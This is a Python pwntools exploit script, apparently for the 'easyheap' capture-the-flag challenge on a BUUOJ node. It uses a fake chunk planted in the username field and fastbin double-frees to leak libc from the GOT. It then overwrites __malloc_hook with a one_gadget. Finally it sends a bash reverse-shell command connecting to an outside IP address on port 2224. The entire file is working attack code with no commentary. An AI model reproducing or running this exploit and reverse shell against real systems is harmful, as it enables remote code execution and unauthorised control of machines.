#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 1
context(arch="amd64", endian='el', os="linux")
context.log_level = "debug"
if debug == 1:
    p = process('./easyheap')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
else:
    p = remote('node3.buuoj.cn', 25709)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6', checksec=False)
elf = ELF('./easyheap', checksec=False)


def add_buf_recv(add_buf_recv_size, add_buf_recv_content):
    p.sendlineafter('>> ', '1')
    p.sendafter('input the size\n', str(add_buf_recv_size))
    p.sendafter('please input your content\n', add_buf_recv_content)


def free_buf_recv():
    p.sendlineafter('>> ', '2')


def add_ptr_recv(add_ptr_recv_content):
    p.sendlineafter('>> ', '666')
    p.sendafter('build or free?\n', '1')
    p.sendafter('please input your content', add_ptr_recv_content)


def free_ptr_recv():
    p.sendlineafter('>> ', '666')
    p.sendafter('build or free?\n', '2')


def add_buf(add_buf_size, add_buf_content):
    p.sendline('1')
    sleep(0.3)
    p.send(str(add_buf_size))
    sleep(0.3)
    p.send(add_buf_content)
    sleep(0.3)


def free_buf():
    p.sendline('2')
    sleep(0.3)


def add_ptr(add_ptr_content):
    p.sendline('666')
    sleep(0.3)
    p.send('1')
    sleep(0.3)
    p.send(add_ptr_content)
    sleep(0.3)


def free_ptr():
    p.sendline('666')
    sleep(0.3)
    p.send('2')
    sleep(0.3)


got____libc_start_main = elf.got['__libc_start_main']
libc_one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

addr_chunk_list = 0x602060
pd = p64(0) + p64(0x7f)
pd += p64(addr_chunk_list)
p.sendafter('please input your username:', pd)
p.sendafter('please input your info:', '1')
add_ptr_recv('a')
add_buf_recv(0x68, 'a')
free_ptr_recv()
add_buf_recv(0x68, 'a')
add_buf_recv(0x30, 'a')
add_buf_recv(0x68, 'a')
free_buf_recv()
free_ptr_recv()
free_buf_recv()
# gdb.attach(p, "b *0x400C40\nc")
add_buf_recv(0x68, p64(addr_chunk_list))
add_buf_recv(0x68, p64(addr_chunk_list))
add_buf_recv(0x68, p64(addr_chunk_list))
pd = p64(0) * 3
pd += p64(got____libc_start_main)
pd += p64(0xdeadbeefdeadbeef)
add_buf_recv(0x68, pd)
p.sendlineafter('>> ', '666')
add_ptr_recv('a')
p.sendlineafter('>> ', '3')

addr___libc_start_main = u64(p.recv(6).ljust(8, '\x00'))
libcbase = addr___libc_start_main - libc.sym['__libc_start_main']
addr___malloc_hook = libcbase + libc.sym['__malloc_hook']
addr___libc_realloc = libcbase + libc.sym['__libc_realloc']
addr_one_gadget = libcbase + libc_one_gadget[3]

add_buf(0x68, 'a')
add_buf(0x68, 'a')
free_ptr()
add_buf(0x68, 'a')
add_buf(0x68, 'a')
free_buf()
free_ptr()
free_buf()
add_buf(0x68, p64(addr___malloc_hook - 0x23))
add_buf(0x68, p64(addr___malloc_hook - 0x23))
add_buf(0x68, p64(addr___malloc_hook - 0x23))
pd = 'a' * 0x0b
pd += p64(addr_one_gadget)
pd += p64(addr___libc_realloc + 20)
add_buf(0x68, pd)
# gdb.attach(p, "b *0x400E24\nc" + "\nsi" * 20)
p.sendline('666')
sleep(0.3)
p.sendline('1')
p.sendline("bash -c 'sh -i &>/dev/tcp/174.0.107.45/2224 0>&1'")
success('addr___libc_start_main = ' + hex(addr___libc_start_main))
success('addr___malloc_hook     = ' + hex(addr___malloc_hook))
success('addr___libc_realloc    = ' + hex(addr___libc_realloc))
success('addr_one_gadget        = ' + hex(addr_one_gadget))
p.interactive()
